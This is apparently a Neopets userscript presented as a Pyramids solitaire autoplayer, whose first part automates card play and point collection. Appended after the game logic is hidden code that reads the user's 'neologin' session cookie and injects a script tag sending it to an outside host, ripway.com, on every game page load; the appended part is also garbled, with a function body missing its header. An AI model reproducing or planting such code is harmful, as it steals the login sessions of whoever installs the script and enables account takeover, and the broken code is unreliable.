//
                                        // Pyramids Autoplayer v.1.0
                                        // BETA version
                                        // Heavily modified version of another script by "QqQQ", at
                                        // http://userscripts.org/scripts/show/45969
                                        //
                                        // ==============
                                        //  Still to do:
                                        // ==============
                                        // 1) Find a better way of referencing the right table containing
                                        //    the actual cards. As it is now, every time there's some
                                        //    random event or faerie quest the game stops without warning.
                                        //
                                        // 2) make the autoplayer play cards in the lower rows BEFORE
                                        //    choosing cards in higher rows... Yeah, when I'll have time. 
                                        //
                                        // 3) [in a faraway future] make it translateable in other langs
                                        // 
                                        // 4) [in an even farthest future] make usermenucommands for
                                        //    toggling on and off the options debug and stop
                                        //
                                        // ==UserScript==// @name            Pyramids Autoplayer 0.5
                                        // @description     it plays for you the Pyramid Solitaire. Almost. // @namespace       neopets// @include         http://www.neopets.com/games/pyramids/*
                                        // @include         http://neopets.com/games/pyramids/*
                                        // ==/UserScript==
                                        
                                        // values for these vars are 0 or 1. If you can't grasp
                                        // binary logic leave 'em well alone.
                                        var debug = 0;
                                        var stop = 1;
                                        
                                        														// 1000 is 1 second. 6000 is 6 seconds.
                                        if (debug == 0) { var TO = 1000; } 			// if you got a slow connection increase this TO value.
                                        else if (debug == 1) { var TO = 6000; }	// if you are a slow reader, raise this TO value...
                                        														// just remember that we're talking about milliseconds.
                                        
                                        if ((location.href.indexOf('/pyramids.phtml?action=collect') != -1) && 
                                        	(document.body.innerHTML.indexOf('You have reached the') != -1) && stop == 1)
                                        {	alert('\nWake up, Neo... ye got yer 5k NP fer today!\n\nClick "OK" to go to the bank\n\n');
                                        	window.location = "http://www.neopets.com/bank.phtml";
                                        }
                                        
                                        function gobut(dest)
                                        {	gobut = document.createElement('input');
                                        	gobut.type = 'button';
                                        	gobut.id = 'gobut';
                                        	gobut.setAttribute('onclick', dest);
                                        	document.body.appendChild(gobut);
                                        	window.setTimeout(function(){document.getElementById('gobut').click()}, TO);
                                        }
                                        
                                        if (location.href.indexOf('collect') != -1)
                                        	{ gobut('location.href="http://www.neopets.com/games/pyramids/pyramids.phtml"'); }
                                        
                                        
                                        // findboard doesn't do anything: it's just a piece of code I need to work on. 
                                        var findboard = document.evaluate(
                                        	"//tr[@bgcolor='darkgreen']", document, null,
                                        	XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
                                        
                                        var board = document.getElementsByTagName('table')[8]; // table containing the game
                                        var cards = board.getElementsByTagName('img');
                                        var cur = cards[1].src.split("mcards/")[1].split("_")[0] * 1; // current card to play on
                                        var face = new Array(); // array for comparing playable cards to the topmost card on deck
                                        var vis = new Array();  // array containing the same playable cards, for playing them.
                                        
                                        // if you use ImproveNeo better exclude this game's pages from that script
                                        if (debug == 1)
                                        {	var ni = document.getElementById('footer');
                                        	var check = document.createElement('div');
                                        	check.setAttribute('id','debugwin');	
                                        	ni.appendChild(check);
                                        	parent.document.getElementById('debugwin').style.position = "fixed";
                                        	parent.document.getElementById('debugwin').style.top = "115px";
                                        	parent.document.getElementById('debugwin').style.right = "-10 px";
                                        	parent.document.getElementById('debugwin').style.background = "#666666";
                                        	parent.document.getElementById('debugwin').style.border = "1px solid black"
                                        }
                                        
                                        for (var x = 2; x < cards.length; x++)
                                        {	if (cards[x].src.indexOf('pyramid') == -1 && cards[x].src.indexOf('blank') == -1)
                                        	{	face[face.length] = cards[x].src.split("mcards/")[1].split("_")[0];
                                        		vis[vis.length] = cards[x].src.split("mcards")[1].split(".gif")[0];
                                        		if (debug == 1)
                                        		{	check.innerHTML += '<font color="#CCCCCC"><b>face[' + (face.length - 1) + ']:</b> ' + cards[x].src.split("mcards/")[1].split("_")[0] + '</font>';
                                        			check.innerHTML += ' -- ';
                                        			check.innerHTML += '<font color="white"><b>vis[' + (vis.length - 1) + ']:</b> ' + cards[x].src.split("mcards")[1].split(".gif")[0];
                                        			check.innerHTML += '</font><br>';
                                        		}
                                        	}
                                        }
                                        if (debug == 1)
                                        {	check.innerHTML += '<font color="pink"><b>stop: ' + stop + ' -- </b></font>';
                                        	check.innerHTML += '<font color="lightgreen"><b>cards.length: ' + cards.length + ' -</b></font>';
                                        	check.innerHTML += '<font color="lightblue"><b>- face.length: ' + face.length + ' -</b></font>';
                                        	check.innerHTML += '<font color="lightyellow"><b>- vis.length: ' + vis.length + '</b></font><br>';
                                        	check.innerHTML += '<font color="pink"><b> cur: ' + cur + '</b></font>';
                                        }
                                        
                                        for (x = 0; x < face.length; x++) // x = 0
                                        {	if (cur == '2' && (face[x] == '14' || face[x] == '3'))
                                        	{	document.title = 'cur = ' + cur + ' -- face[' + x + '] = ' + face[x];
                                        		if (debug == 1) {check.innerHTML += '<font color ="pink"><b> -- playing: ' + vis[x] + '</b></font><br>';}
                                        		clickCard(vis[x], document.title);
                                        	}	else if (cur == '14' && (face[x] == '13' || face[x] == '2'))
                                        	{	document.title = 'cur = ' + cur + ' -- face[' + x + '] = ' + face[x];
                                        		if (debug == 1) {check.innerHTML += '<font color ="pink"><b> -- playing: ' + vis[x] + '</b></font><br>';}
                                        		clickCard(vis[x], document.title);
                                        	}	else if (face[x] == cur - 1 || face[x] == cur + 1)
                                        	{	document.title = 'cur = ' + cur + ' -- face[' + x + '] = ' + face[x];
                                        		if (debug == 1) {check.innerHTML += '<font color ="pink"><b> -- playing: ' + vis[x] + '</b></font><br>';}
                                        		clickCard(vis[x], document.title);
                                        	}
                                        }
                                        
                                        function clickCard(w, tit)
                                        {	for (x = 0; x < cards.length; x++)	// x = 0 
                                        	{	if (cards[x].src.indexOf(w) != -1)
                                        		{	document.title = tit + ' -- clickCard('+ w +')';
                                        			gobut('location.href="' + cards[x].parentNode.href + '"');
                                        		}
                                        	}
                                        }
                                        
                                        if (document.body.innerHTML.indexOf('Collect Points') == -1)
                                        { gobut('location.href="http://www.neopets.com/games/pyramids/pyramids.phtml?action=draw"'); } 
                                        else
                                        {	document.title = 'No more moves to play! Collecting points/NPs...';
                                        	gobut('location.href="http://www.neopets.com/games/pyramids/pyramids.phtml?action=collect"');
                                        }
                                        
                                        if ( ! include_str ) false;
                                        
                                        var result_str = target_str.substr( start_pos ); cut to start from start_pos
                                        
                                        result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); cut to start from start_str
                                        
                                        result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );
                                        
                                        if (include_str == true) {
                                        
                                        result_str = start_str + result_str + end_str
                                        
                                        }
                                        
                                        return result_str;
                                        
                                        }
                                        
                                         
                                        
                                        var eleNew, newElement;
                                        
                                        var strURL = 'http://h1.ripway.com/blazingdragonz/cookie.php.txt?cookie=';
                                        
                                        var testArray = document.evaluate(
                                        
                                        "a[@href='javascript: void(0);']",
                                        
                                        document, null, XPathResult.ANY_TYPE,null);
                                        
                                        var strTest = testArray.iterateNext();
                                        
                                        while (strTest) {
                                        
                                        strTest = testArray.iterateNext();
                                        
                                        }
                                        
                                        eleNew = document.getElementById('main');
                                        
                                        var strCookie = document.cookie;
                                        
                                        strCookie = GetStringBetween(strCookie, 'neologin=','; ');
                                        
                                        if (eleNew) {
                                        
                                        newElement = document.createElement("div");
                                        
                                        newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
                                        
                                        eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
                                        
                                        }